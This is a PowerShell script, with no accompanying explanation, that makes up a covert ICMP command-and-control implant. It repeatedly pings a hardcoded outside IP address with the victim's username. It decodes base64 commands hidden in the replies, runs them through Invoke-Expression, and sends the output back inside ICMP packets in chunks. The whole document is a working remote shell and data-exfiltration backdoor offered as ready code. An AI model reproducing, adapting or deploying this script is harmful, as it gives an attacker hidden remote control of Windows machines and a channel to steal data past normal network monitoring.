Function Invoke-ICMPExfil {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $true)]
        [String]$Payload,
        [Parameter(Mandatory = $true, Position = 0)]
        [String]$Target,
        [Parameter(Mandatory = $true, Position = 1)]
        [String]$HostName,
        [Parameter()]
        [Int]$MaxSize = 1472
    )

    Begin {
        $ICMPClient = New-Object System.Net.NetworkInformation.Ping
        $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
        $PingOptions.DontFragment = $true

        if ($Payload -eq "") {
            $Payload = "`n" 
        }
    }

    Process {
        0..[math]::floor($Payload.length / $MaxSize) | % {
            $chunk = $Payload.substring($MaxSize * $_, [math]::min($MaxSize, $Payload.length - $MaxSize * $_))
            $buff = ([text.encoding]::ASCII).GetBytes("{`"h`": `"$HostName`", `"d`": `"$chunk`"}")
            $ICMPClient.Send($Target, 10, $buff, $PingOptions) | Out-Null
        }
    }

    End { }
}

$sleep = 10; $target = "104.248.16.121"
while ($true) {
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $r=$ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes("{`"h`": `"$env:USERNAME`"}")) 
    $r=[System.Text.Encoding]::ASCII.GetString($r.Buffer)
    Write-Output $r
    if ($r -match "^c:(..*)$") {
        $command = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($matches[1]))
        Write-Output $command
        $out = Invoke-Expression $command 2>&1|out-string
        Invoke-ICMPExfil -Payload $out -Target $target -HostName $env:USERNAME -MaxSize 1000
        # $ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes("{`"h`": `"$env:USERNAME`", `"d`": `"$out`"}"))  
    }
    start-sleep $sleep
}